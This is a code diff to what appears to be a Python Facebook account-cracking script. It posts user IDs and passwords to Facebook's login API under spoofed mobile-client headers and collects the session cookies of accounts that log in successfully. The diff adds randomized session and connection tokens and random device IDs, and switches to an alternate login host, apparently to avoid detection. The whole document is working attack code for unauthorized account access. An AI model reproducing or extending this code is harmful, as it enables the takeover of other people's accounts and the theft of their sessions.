@@ -11,6 +11,7 @@ from rich import print
 import requests
 import certifi
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
+
 version = "  v1"
 
 ua = []
@@ -59,7 +60,33 @@ def dd(fbbd, device):
     # Add other brands if needed
     else:
         return device
+def generate_random_string(lowercase_count, numeric_count):
+    lowercase_chars = string.ascii_lowercase
+    numeric_chars = string.digits
 
+    lowercase_part = ''.join(random.choices(lowercase_chars, k=lowercase_count))
+    numeric_part = ''.join(random.choices(numeric_chars, k=numeric_count))
+
+    return lowercase_part + numeric_part
+
+
+def shuffle_string(s):
+    shuffled_list = list(s)
+    random.shuffle(shuffled_list)
+    return ''.join(shuffled_list)
+
+
+lowercase_count = 16
+numeric_count = 18
+
+low = 10
+num = 22
+
+ran_string = generate_random_string(low, num)
+shuffled_cid = shuffle_string(ran_string)
+
+random_string = generate_random_string(lowercase_count, numeric_count)
+shuffled_connection_token = shuffle_string(random_string)
 
 class Sort:
     @staticmethod
@@ -150,7 +177,7 @@ def file_sub(uid, pwx, name, meth, fl):
             data = {
                 "adid": adi,
                 "format": "json",
-                "device_id": adi,
+                "device_id": str(uuid.uuid4()),
                 "cpl": "true",
                 "family_device_id": str(uuid.uuid4()),
                 "credentials_type": "device_based_login_password",
@@ -171,25 +198,21 @@ def file_sub(uid, pwx, name, meth, fl):
                 "api_key": "882a8490361da98702bf97a021ddc14d"}
             head = {
                 'User-Agent': useragent,
-                'Accept': '*/*',
                 'Content-Type': 'application/x-www-form-urlencoded',
                 'Host': 'graph.facebook.com',
-                'Connection': 'close',
-                'cache-control': 'no-cache',
-                'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
                 'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                 'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
-                'X-FB-Connection-Type': 'WIFI',
+                'X-FB-Connection-Type': 'MOBILE.LTE',
                 'X-Tigon-Is-Retry': 'False',
-                'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-                'X-fb-device-group': str(random.randint(2000, 4000)),
+                'X-fb-session-id': f'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid={shuffled_cid}',
+                'X-fb-device-group': '5120',
                 'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                 'X-FB-Request-Analytics-Tags': 'graphservice',
                 'X-FB-HTTP-Engine': 'Liger',
                 'X-FB-Client-IP': 'True',
                 'X-FB-Server-Cluster': 'True',
-                'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
-            url = 'https://graph.facebook.com/auth/login'
+                'X-fb-connection-token': f'{shuffled_connection_token}', }
+            url = 'https://b-graph.facebook.com/auth/login'
             rq = requests.post(url, data=data, headers=head, allow_redirects=False, verify=certifi.where()).json()
             if "session_key" in rq:
                 coki = ";".join(i["name"] + "=" + i["value"] for i in rq["session_cookies"])
